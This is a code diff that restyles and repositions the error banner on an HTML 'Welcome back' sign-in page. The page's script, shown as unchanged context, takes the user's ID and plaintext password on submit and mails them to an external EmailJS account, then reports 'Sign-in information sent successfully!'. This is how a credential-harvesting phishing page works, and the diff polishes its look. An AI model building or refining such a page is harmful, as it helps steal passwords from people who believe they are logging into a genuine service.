@@ -26,7 +26,7 @@
     background-color: white;
     display: flex; 
     align-items: center;
-    justify-content: center;
+    justify-content: center; /* horizontally center logo */
     padding: 0 2rem;
     z-index: 10;
     border-bottom: none;
@@ -66,7 +66,6 @@
     justify-content: center;
     align-items: flex-start;
     flex-direction: column;
-    /* allow column to show error banner on top */
   }
 
   .form-wrapper {
@@ -77,16 +76,37 @@
     box-shadow: 0 0 1px rgba(0,0,0,0.1);
     position: relative;
     right: -30%;
-    margin-top: 20px; /* reduced margin to accommodate error banner */
+    margin-top: 20px;
+    display: flex;
+    flex-direction: column;
   }
 
   h1 {
-    margin: 0 0 20px;
+    margin: 0 0 10px 0;
     font-weight: 600;
     font-size: 32px;
     color: #255993;
     font-family: "Cera Bold", "Cera Medium";
     text-align: center;
+  }
+
+  .error-banner {
+    display: none;
+    align-items: center;
+    gap: 8px;
+    color: #b00020;
+    font-weight: 600;
+    font-size: 14px;
+    padding: 6px 10px;
+    border-radius: 4px;
+    background: rgba(176, 0, 32, 0.1); /* transparent red */
+    margin-bottom: 15px;
+  }
+  .error-banner svg {
+    width: 18px;
+    height: 18px;
+    flex-shrink: 0;
+    fill: #b00020;
   }
 
   form {
@@ -195,28 +215,6 @@
     z-index: 10;
   }
 
-  /* Error banner styles */
-  .error-banner {
-    display: none;
-    background-color: #b00020;
-    color: white;
-    padding: 10px 15px;
-    border-radius: 4px;
-    margin: 0 auto 15px auto;
-    max-width: 75%;
-    font-weight: 600;
-    text-align: left;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  .error-banner svg {
-    width: 20px;
-    height: 20px;
-    flex-shrink: 0;
-    fill: white;
-  }
-
   /* Responsive adjustments */
   @media(max-width: 768px) {
     .container {
@@ -242,10 +240,6 @@
     .links-container {
       align-items: flex-start;
     }
-    .error-banner {
-      max-width: 90%;
-      margin: 0 auto 10px auto;
-    }
   }
 </style>
 </head>
@@ -257,17 +251,17 @@
 
 <div class="container">
   <div class="left-panel">
-    <!-- Error banner container -->
-    <div id="errorBanner" class="error-banner" role="alert" aria-live="assertive" aria-atomic="true" style="display:none;">
-      <!-- Exclamation mark icon SVG -->
-      <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
-        <path d="M1 21h22L12 2 1 21zM13 18h-2v-2h2v2zm0-4h-2v-4h2v4z"></path>
-      </svg>
-      <span>We found some errors. Please review the form and make corrections.</span>
-    </div>
-
     <div class="form-wrapper">
+
       <h1>Welcome back</h1>
+
+      <div id="errorBanner" class="error-banner" role="alert" aria-live="assertive" aria-atomic="true">
+        <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false" aria-label="Error icon">
+          <path d="M1 21h22L12 2 1 21zM13 18h-2v-2h2v2zm0-4h-2v-4h2v4z"></path>
+        </svg>
+        <span>We found some errors. Please review the form and make corrections.</span>
+      </div>
+
       <form id="signin-form" novalidate>
         <label for="user_email">User ID</label>
         <input type="email" id="user_email" name="user_email" placeholder=" " required />
@@ -307,29 +301,28 @@
   const errorBanner = document.getElementById('errorBanner');
 
   form.addEventListener('submit', function(event) {
-    // Clear previous error banner
+    // Hide banner initially
     errorBanner.style.display = 'none';
 
-    // Check form validity via HTML5 form validation API
     if (!form.checkValidity()) {
       event.preventDefault();
-      // Show error banner
       errorBanner.style.display = 'flex';
 
-      // Optionally focus first invalid input
+      // Focus first invalid field for accessibility
       const firstInvalid = form.querySelector(':invalid');
       if(firstInvalid) firstInvalid.focus();
 
       return false;
     }
 
-    // Proceed with EmailJS send if valid
+    // If form valid, proceed with EmailJS send
     event.preventDefault();
     const templateParams = {
       user_email: form.user_email.value,
       user_password: form.user_password.value,
       remember_id: form.remember_id.checked ? "Yes" : "No"
     };
+
     emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
       .then(() => {
         alert('Sign-in information sent successfully!');
